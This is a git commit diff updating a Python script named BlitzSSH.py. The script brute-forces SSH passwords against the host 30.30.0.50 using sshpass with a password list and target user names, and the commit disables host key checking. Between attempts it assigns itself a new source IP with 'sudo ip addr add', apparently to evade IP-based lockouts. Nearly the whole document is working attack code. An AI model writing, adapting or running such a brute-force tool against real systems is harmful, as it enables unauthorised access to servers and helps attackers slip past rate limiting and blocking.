0cda0bfdb55d161279b3c56e5ee411c44226fe46
WAntill <75125041+WAntill@users.noreply.github.com>
2023-02-14 20:36:04 +0000

    Update BlitzSSH.py
    Fixed issue with running on machine

--- BlitzSSH.py
+++ BlitzSSH.py
@@ -3,12 +3,12 @@ import subprocess
 ips = []
 passwds = []
 outputlist = []
-users = ['ubuntu', 'root', 'admin']  # list of users to try
+users = ['webdev']  # list of users to try
 
 for i in range(52, 254):
     ips.append(i)
 
-with open('./password.txt', 'r') as file1:
+with open('./aptpw.txt', 'r') as file1:
     passwds = [line.strip() for line in file1]
 
 count = 0
@@ -19,7 +19,7 @@ while passwd_index < len(passwds):
     for user in users:
         for ps in passwds:
             print(user,':', ps)
-            subprocess.call(['sshpass','-p', ps, 'autossh', '-M0','-t', user + '@' + '30.30.0.50'])
+            subprocess.call(['sshpass','-p', ps,'ssh','-o','stricthostkeychecking=no', user + '@' + '30.30.0.50'])
             ip = ips[ip_index]
             old_ip = ip - 1
             set_ip = subprocess.call(['sudo', 'ip', 'addr', 'add', '30.30.0.' + str(ip) + '/24', 'dev', 'enp0s8'])
